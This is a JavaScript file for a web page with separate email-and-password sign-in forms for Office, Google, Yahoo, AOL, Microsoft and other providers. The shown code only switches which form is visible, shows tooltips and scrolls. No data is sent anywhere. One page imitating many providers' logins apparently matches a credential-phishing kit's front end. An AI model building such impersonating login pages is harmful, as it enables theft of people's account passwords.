$('[data-toggle="tooltip"]').tooltip({
    trigger: 'manual'
});

$(document).ready(function(){
    $('[data-toggle="tooltip"]').tooltip('show');
    setTimeout(function(){$('[data-toggle="tooltip"]').tooltip('hide');}, 6000);
})
window.onload = function(){
    scrollTop();
    $('.footer').hide();
}

function scrollTop(){
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
}

var officeContainer = document.querySelector(".form-container-office");
var officeBtn = document.querySelector("#officeBtn");
var officeEmail = document.querySelector('#officeEmail');
var officePassword = document.querySelector('#officePassword');
var officeSignIn = document.querySelector('#officeSignIn');
var officeAlert = document.querySelector('.officeAlert');

var googleContainer = document.querySelector(".form-container-google");
var googleBtn = document.querySelector("#googleBtn");
var googleEmail = document.querySelector('#googleEmail');
var googlePassword = document.querySelector('#googlePassword');
var googleSignIn = document.querySelector('#googleSignIn');
var googleAlert = document.querySelector('.googleAlert');

var yahooContainer = document.querySelector(".form-container-yahoo");
var yahooBtn = document.querySelector("#yahooBtn");
var yahooEmail = document.querySelector('#yahooEmail');
var yahooPassword = document.querySelector('#yahooPassword');
var yahooSignIn = document.querySelector('#yahooSignIn');
var yahooAlert = document.querySelector('.yahooAlert');

var aolContainer = document.querySelector(".form-container-aol");
var aolBtn = document.querySelector("#aolBtn");
var aolEmail = document.querySelector('#aolEmail');
var aolPassword = document.querySelector('#aolPassword');
var aolSignIn = document.querySelector('#aolSignIn');
var aolAlert = document.querySelector('.aolAlert');

var msContainer = document.querySelector(".form-container-ms");
var msBtn = document.querySelector("#msBtn");
var msEmail = document.querySelector('#msEmail');
var msPassword = document.querySelector('#msPassword');
var msSignIn = document.querySelector('#msSignIn');
var msAlert = document.querySelector('.msAlert');

var otherContainer = document.querySelector(".form-container-other");
var otherBtn = document.querySelector("#otherBtn");
var anotherEmailAddr = document.querySelector('#anotherEmailAddress');
var anotherPassword = document.querySelector('#anotherPassword');
var anotherSignIn = document.querySelector('#anotherSignIn');
var anotherAlert = document.querySelector('.anotherAlert');

var checkemail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;

officeBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bhide\b/g, "show");
    yahooContainer.className = yahooContainer.className.replace(/\bshow\b/g, "hide");
    aolContainer.className = aolContainer.className.replace(/\bshow\b/g, "hide");
    googleContainer.className = googleContainer.className.replace(/\bshow\b/g, "hide");
    msContainer.className = msContainer.className.replace(/\bshow\b/g, "hide");
    otherContainer.className = otherContainer.className.replace(/\bshow\b/g, "hide");
})

googleBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bshow\b/g, "hide");
    yahooContainer.className = yahooContainer.className.replace(/\bshow\b/g, "hide");
    aolContainer.className = aolContainer.className.replace(/\bshow\b/g, "hide");
    googleContainer.className = googleContainer.className.replace(/\bhide\b/g, "show");
    msContainer.className = msContainer.className.replace(/\bshow\b/g, "hide");
    otherContainer.className = otherContainer.className.replace(/\bshow\b/g, "hide");
    scrollTop();
})

yahooBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bshow\b/g, "hide");
    yahooContainer.className = yahooContainer.className.replace(/\bhide\b/g, "show");
    aolContainer.className = aolContainer.className.replace(/\bshow\b/g, "hide");
    googleContainer.className = googleContainer.className.replace(/\bshow\b/g, "hide");
    msContainer.className = msContainer.className.replace(/\bshow\b/g, "hide");
    otherContainer.className = otherContainer.className.replace(/\bshow\b/g, "hide");
    scrollTop();
})

aolBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bshow\b/g, "hide");
    yahooContainer.className = yahooContainer.className.replace(/\bshow\b/g, "hide");
    aolContainer.className = aolContainer.className.replace(/\bhide\b/g, "show");
    googleContainer.className = googleContainer.className.replace(/\bshow\b/g, "hide");
    msContainer.className = msContainer.className.replace(/\bshow\b/g, "hide");
    otherContainer.className = otherContainer.className.replace(/\bshow\b/g, "hide");
})

msBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bshow\b/g, "hide");
    yahooContainer.className = yahooContainer.className.replace(/\bshow\b/g, "hide");
    aolContainer.className = aolContainer.className.replace(/\bshow\b/g, "hide");
    googleContainer.className = googleContainer.className.replace(/\bshow\b/g, "hide");
    msContainer.className = msContainer.className.replace(/\bhide\b/g, "show");
    otherContainer.className = otherContainer.className.replace(/\bshow\b/g, "hide");
})

otherBtn.addEventListener('click', function(){
    officeContainer.className = officeContainer.className.replace(/\bshow\b/g, "hide");
    yahooContainer.className = yahooContainer.className.replace(/\bshow\b/g, "hide");
    aolContainer.className = aolContainer.className.replace(/\bshow\b/g, "hide");
    googleContainer.className = googleContainer.className.replace(/\bshow\b/g, "hide");
    msContainer.className = msContainer.className.replace(/\bshow\b/g, "hide");
    otherContainer.className = otherContainer.className.replace(/\bhide\b/g, "show");
    scrollTop();
})

var footer = document.querySelector('.footer');
var toggler = document.querySelector('.toggler');

toggler.addEventListener('click', function(){
    $('.footer').toggle("slow");
    $('html, body').animate({
        scrollTop: document.body.scrollHeight
    }, "fast");
})